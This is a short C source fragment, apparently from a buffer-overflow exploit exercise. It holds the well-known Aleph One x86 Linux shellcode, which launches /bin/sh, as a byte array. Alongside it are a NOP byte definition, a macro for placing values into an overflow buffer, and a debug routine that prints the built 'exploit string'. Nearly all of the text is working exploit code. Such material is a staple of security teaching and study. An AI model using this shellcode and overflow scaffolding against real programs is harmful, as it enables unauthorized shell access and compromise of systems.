/*
 *  * Aleph One shellcode.
 *   */
static char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";

#define NOP 0x90

#define SET_VALUE(buffer, pos, value) memcpy(&buffer[(pos)], &(value), sizeof(value))

/* for debugging */
void print_exploit(char *buf, int len){
	printf("Exploit String:\n");
	printf("  i: hex char\n");
 	int i;
 	for(i = 0; i < 200; i++){
		printf("%3d: %hhx\t%c\n", i, buf[i], buf[i]);
	}	
}
